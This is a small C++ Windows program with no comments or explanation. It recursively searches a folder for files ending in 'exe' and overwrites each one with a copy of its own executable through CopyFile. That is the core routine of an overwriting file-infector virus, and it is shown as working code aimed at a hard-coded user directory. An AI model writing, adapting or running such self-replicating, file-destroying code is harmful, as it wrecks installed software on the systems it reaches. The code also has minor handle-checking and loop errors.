#include <iostream>
#include <vector>
#include <windows.h>
using namespace std;

class ProcessFile
{
private:
    vector<string>  result;
public:
    vector<string>  getResult()
    {
        auto   t = result;
        result.clear();
        return t;
    }
    bool  search(char* path , char* file ) {
        HANDLE hFile;
        char   buffer[MAX_PATH] = { 0, };
        WIN32_FIND_DATA pNextInfo;  
        sprintf(buffer, "%s\\*.*", path);
        hFile = FindFirstFile(buffer, &pNextInfo);
        if (!hFile) {

            return false;
        }
        string  t;
        while (FindNextFile(hFile, &pNextInfo))
        {

            if (pNextInfo.cFileName[0] == '.')
                continue;
            if (pNextInfo.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                ZeroMemory(buffer, MAX_PATH);
                sprintf(buffer, "%s\\%s", path, pNextInfo.cFileName);
                search(buffer, file);
            }

            t.assign(path);
            t += '\\';
            t.append(pNextInfo.cFileName);
            int len = strlen(file);
            if (t.substr(t.size() - len) == file)
            {
                result.push_back(t);
            }

        }
        return true;
    }
};

int main() {

    ProcessFile  s;
    char szSelfName[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, szSelfName, MAX_PATH);
    cout << szSelfName << endl;

    s.search("C:\\Users\\eddie\\source\\repos\\reverse\\Debug", "exe");        
    auto result = s.getResult();

    for (int i = 0; i < result.size(); i++)
    {
        cout << result[i].c_str() << endl;
        
        CopyFile(szSelfName, result[i].c_str(), FALSE);

    }

    return 0;
}

